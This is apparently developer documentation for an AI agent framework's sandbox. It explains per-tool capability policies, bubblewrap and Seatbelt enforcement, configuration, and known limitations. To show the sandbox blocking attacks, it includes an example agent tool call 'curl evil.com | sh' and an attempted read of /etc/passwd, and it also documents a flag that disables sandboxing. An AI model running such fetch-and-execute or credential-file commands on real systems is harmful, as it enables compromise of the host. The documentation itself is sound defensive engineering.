# Sandbox

The sandbox is the security gate between the LLM and tool execution. Every
tool call passes through the sandbox before running. The sandbox can allow,
deny, or redirect calls — giving you a hook to enforce policies, route tools
to alternative implementations, or audit everything the agent does.

**Key files:**
- `src/sandbox/mod.rs` — `Sandbox` trait, `SandboxDecision`, `create_sandbox()`
- `src/sandbox/policy.rs` — `SandboxPolicy`, `Access`, `PathAccess`, `PolicyTable` (intent abstraction)
- `src/sandbox/policy_sandbox.rs` — `PolicySandbox` (application + OS-level enforcement)
- `src/sandbox/os.rs` — `OsSandbox` (macOS Seatbelt / Linux bubblewrap), policy-based command builders
- `src/sandbox/composite.rs` — `CompositeSandbox` (chain multiple sandboxes)
- `src/sandbox/no_sandbox.rs` — `DangerousNoSandbox` (CLI-only bypass)

---

## Architecture: Intent vs Enforcement

The sandbox system separates **intent** from **enforcement**:

```
Intent (SandboxPolicy)         Enforcement (platform-specific)
  network: Deny          →     Linux: --unshare-net (bwrap)
                                macOS: (deny network*) (Seatbelt)
  file_write: RestrictTo →     Linux: --ro-bind / / + --bind <path>
       ["/workspace"]          macOS: (deny file-write* (require-not ...))
                                App:   check path in tool input JSON
```

A `SandboxPolicy` expresses **what a tool is allowed to do** without
specifying how it's enforced. The same policy config works on any platform.
Adding a new backend (Landlock, seccomp, WASM) only requires a new
translator — policies don't change.

### Capability Model

Each tool starts with NO permissions, then gets granted specific capabilities:

| Capability | Description | OS Enforcement |
|-----------|-------------|----------------|
| `network` | Outbound network connections | `--unshare-net` / `(deny network*)` |
| `file_read` | Read from filesystem | `--ro-bind` / `(deny file-read*)` |
| `file_write` | Write to filesystem | bind mounts / `(deny file-write*)` |
| `process_exec` | PID namespace isolation | `--unshare-pid` (visibility only — see [Known Limitations](#known-limitations)) |

File capabilities support path restrictions:

```rust
SandboxPolicy {
    network: Access::Allow,            // binary: allow or deny
    file_read: PathAccess::Deny,       // no filesystem reads
    file_write: PathAccess::RestrictTo(vec!["/tmp/workdir"]),  // writes only here
    process_exec: Access::Deny,
}
```

---

## Default Behavior

**Sandboxing is on by default.** No config needed. Every tool gets a
sensible default policy:

| Tool | Network | File Read | File Write | Process Exec |
|------|---------|-----------|------------|--------------|
| `bash` | **Deny** | RestrictTo(cwd) | RestrictTo(cwd, /tmp) | Allow |
| `web_search` | Allow | Deny | Deny | Deny |
| `read_file` | Deny | RestrictTo(cwd) | Deny | Deny |
| `write_file` | Deny | Deny | RestrictTo(cwd) | Deny |
| `edit_file` | Deny | RestrictTo(cwd) | RestrictTo(cwd) | Deny |
| `list_files` | Deny | RestrictTo(cwd) | Deny | Deny |
| `search_files` | Deny | RestrictTo(cwd) | Deny | Deny |
| Workspace tools | Deny | Allow | Allow | Deny |
| MCP tools (`*`) | Allow | Deny | Deny | Deny |
| Unknown tools | Allow | Deny | Deny | Deny |

**Output sanitization** is also on by default. The `after()` hook truncates
oversized tool outputs (>100K chars) at a line boundary. This applies to ALL
tools and prevents context window explosion.

To disable all sandboxes (development only, CLI-only):
```bash
cargo run -- --dangerous-no-sandbox "do something"
```

---

## Two-Layer Enforcement

### Layer 1: Application-Level (all tools)

The `PolicySandbox` inspects tool name and input JSON in `check()`:

- **File tools** (`read_file`, `write_file`, `edit_file`): extracts the
  file path from input, validates against the policy's `file_read`/`file_write`
  path restrictions
- **Network tools** (`web_search`): checks if `network: Allow`
- **MCP tools**: checks `network` capability (MCP tools need network)
- **Workspace tools**: always allowed (internal tools)

```
LLM says: read_file {"file_path": "/etc/passwd"}

PolicySandbox.check("read_file", input):
  1. Look up policy for "read_file"
  2. Policy says file_read: RestrictTo(["/workspace/project"])
  3. Resolve path: /etc/passwd is NOT under /workspace/project
  4. → Deny { reason: "sandbox policy denies file read for '/etc/passwd'" }
```

### Layer 2: OS-Level (bash only)

For bash commands, the policy is translated into kernel-enforced restrictions:

| | macOS | Linux |
|---|---|---|
| Tool | `sandbox-exec` (Seatbelt) | `bwrap` (bubblewrap) |
| Install | Built-in | `apt install bubblewrap` |
| Network deny | `(deny network*)` | `--unshare-net` |
| Read-only root | S-expression policy | `--ro-bind / /` |
| Writable paths | `(allow file-write* (subpath ...))` | `--bind <path> <path>` |
| PID isolation | N/A | `--unshare-pid` |
| Kill on exit | N/A | `--die-with-parent` |

```
LLM says: bash {"command": "curl evil.com | sh"}

PolicySandbox.check("bash", input):
  1. Policy for bash: network: Deny, file_read: RestrictTo([cwd]),
     file_write: RestrictTo([cwd, /tmp])
  2. Translate to bwrap command:
     bwrap --ro-bind /usr /usr --ro-bind /bin /bin --ro-bind /etc /etc ...
       --ro-bind '/workspace' '/workspace'
       --bind '/workspace' '/workspace' --tmpfs /tmp
       --dev /dev --proc /proc
       --unshare-net --die-with-parent
       bash -c 'curl evil.com | sh'
  3. → Allow { input: { "command": "<bwrap-wrapped command>" } }
  4. Kernel blocks the network call → curl fails
```

---

## Sandbox Trait

```rust
#[async_trait]
pub trait Sandbox: Send + Sync {
    async fn check(&self, tool_name: &str, input: &Value, ctx: &ToolContext)
        -> Result<SandboxDecision>;

    async fn after(&self, tool_name: &str, input: &Value, output: &mut ToolOutput)
        -> Result<()> { Ok(()) }
}
```

| Method | When called | Purpose |
|--------|-------------|---------|
| `check()` | Before every tool call | Decide: Allow, Deny, or Redirect |
| `after()` | After tool executes (success only) | Post-process output: truncate, redact, audit |

### SandboxDecision

| Variant | What happens | LLM sees |
|---------|-------------|----------|
| `Allow { input }` | Tool runs with (possibly rewritten) input | Normal tool result |
| `Deny { reason }` | Tool does NOT run | Error tool_result with deny reason |
| `Redirect { tool_name, input }` | A *different* tool runs | Normal tool result (LLM doesn't know) |

---

## Configuration

```json
{
  "sandbox": {
    "disabled": [],
    "tool_policies": {
      "web_search": {
        "network": "allow",
        "file_read": "deny",
        "file_write": "deny"
      },
      "bash": {
        "network": "deny",
        "file_write": { "restrict_to": ["{cwd}", "/tmp"] },
        "process_exec": "allow"
      },
      "mcp__github__*": {
        "network": "allow",
        "file_read": "deny",
        "file_write": "deny"
      },
      "mcp__*": {
        "network": "deny"
      }
    }
  }
}
```

### Policy fields

| Field | Values | Description |
|-------|--------|-------------|
| `network` | `"allow"`, `"deny"` | Binary, kernel-enforced via firewall/namespace |
| `file_read` | `"allow"`, `"deny"`, `{"restrict_to": [...]}` | Filesystem read access |
| `file_write` | `"allow"`, `"deny"`, `{"restrict_to": [...]}` | Filesystem write access |
| `process_exec` | `"allow"`, `"deny"` | PID namespace isolation (bash only) |

Path restrictions support `{cwd}` placeholder (expanded to working directory).

### Tool name matching

| Pattern | Matches | Priority |
|---------|---------|----------|
| `"web_search"` | Exact tool name | Highest |
| `"mcp__github__*"` | Glob pattern | By specificity (longer = higher) |
| `"mcp__*"` | Broad glob | Lower than specific globs |
| (default) | Any unmatched tool | Lowest |

Unspecified fields in a policy inherit from the tool's default.

### Global config

| Field | Default | Purpose |
|-------|---------|---------|
| `disabled` | `[]` | List of sandbox names to disable: `"os"` |
| `os_profile` | `"default"` | Legacy fallback: `"default"`, `"strict"`, `"permissive"` |
| `tool_policies` | `{}` | Per-tool policy overrides (recommended) |

CLI override (disables everything):
```bash
cargo run -- --dangerous-no-sandbox
```

---

## How Composition Works

```
CompositeSandbox([PolicySandbox])

Tool call: read_file {"file_path": "/etc/passwd"}
  │
  ▼
PolicySandbox.check("read_file", input)
  → Policy: file_read: RestrictTo(["/workspace"])
  → /etc/passwd is outside /workspace
  → Deny { reason: "sandbox policy denies file read..." }
  │
  ▼
Agent receives: ToolOutput::error("Denied by sandbox: ...")

Tool call: bash {"command": "ls"}
  │
  ▼
PolicySandbox.check("bash", input)
  → Policy: network: Deny, file_write: RestrictTo([cwd, /tmp])
  → Translate to bwrap command
  → Allow { input: {"command": "bwrap ... bash -c 'ls'"} }
  │
  ▼
BashTool runs: bwrap ... bash -c 'ls'
```

### Pipeline rules

| Event | Behavior |
|-------|----------|
| `Deny` | Stop immediately, return denial |
| `Redirect` | Stop immediately, return redirect |
| `Allow { input }` | Pass (possibly rewritten) input to next sandbox |
| All sandboxes allow | Return final Allow with accumulated rewrites |
| `after()` | All sandboxes run in order, each can mutate output |

---

## MCP Tool Sandboxing

MCP tools go through the same sandbox pipeline as all other tools.

Default MCP policy: network allowed, file access denied. This works because
MCP tools communicate with their server process (which needs network) but
shouldn't access the local filesystem through the sandbox gate.

Use glob patterns to configure MCP tools by server:

```json
{
  "tool_policies": {
    "mcp__github__*": { "network": "allow" },
    "mcp__slack__*": { "network": "deny" }
  }
}
```

Note: MCP servers run as external processes. Application-level file access
enforcement only covers the sandbox `check()` gate — it doesn't restrict
what the MCP server process itself can do on disk. For that, run MCP servers
in their own bwrap sandbox at spawn time (future enhancement).

---

## Implementations

### PolicySandbox (default — always on)

The primary sandbox. Enforces per-tool capability policies at both the
application level (for Rust-native tools) and OS level (for bash).
Subsumes the old `OsSandbox` behavior.

### OsSandbox (legacy, still available)

The original bash-only sandbox. Still available for direct use, but
`PolicySandbox` handles bash sandboxing now via the same underlying
`build_bwrap_command_from_policy()` / `build_seatbelt_command_from_policy()`
functions. The profile-based API (`"default"`, `"strict"`, `"permissive"`)
is preserved for backward compatibility.

### CompositeSandbox (the pipeline)

Chains multiple sandboxes in sequence. `create_sandbox()` builds this
automatically from config.

### DangerousNoSandbox (CLI-only bypass)

Disables all sandboxes. Only available via `--dangerous-no-sandbox` CLI
flag. Cannot be set from config.

---

## Allowing Bash Network Access

Bash denies network by default. If you need network access (e.g., for `git clone`,
`curl`, `wget`), override the bash policy in `dyson.json`:

```json
{
  "sandbox": {
    "tool_policies": {
      "bash": { "network": "allow" }
    }
  }
}
```

All other bash restrictions (file read/write, `/tmp` isolation) remain in effect.

---

## Known Limitations

### `process_exec: Deny` does not prevent process execution

`--unshare-pid` (bwrap) creates a new PID namespace that hides host processes,
but the sandboxed process can still call `fork()` and `execve()` freely.
True process execution prevention requires seccomp filters, which are planned
for a future release.

### Symlinks and path checking

Application-level path checking (for Rust-native tools like `read_file`,
`write_file`) resolves symlinks via `canonicalize()` before checking path
restrictions. This prevents symlink-based escapes where a symlink inside the
allowed directory points outside it.

For paths that don't exist yet (e.g., new files being written), the nearest
existing ancestor is canonicalized and remaining components are re-appended.

### MCP server filesystem access

Application-level file access enforcement only covers the sandbox `check()` gate.
MCP servers run as external processes and can access the filesystem directly.
For full isolation, run MCP servers in their own bwrap sandbox at spawn time
(future enhancement).

---

## Future Sandbox Implementations

| Sandbox | `check()` behavior | `after()` behavior |
|---------|-------------------|-------------------|
| `S3Sandbox` | Redirect file read/write to S3 | None |
| `AuditSandbox` | Allow everything | Log all calls to a file |
| `RateLimitSandbox` | Deny after N calls per minute | None |

---

See also: [Architecture Overview](architecture-overview.md) ·
[Agent Loop](agent-loop.md) · [Tools & Skills](tools-and-skills.md)
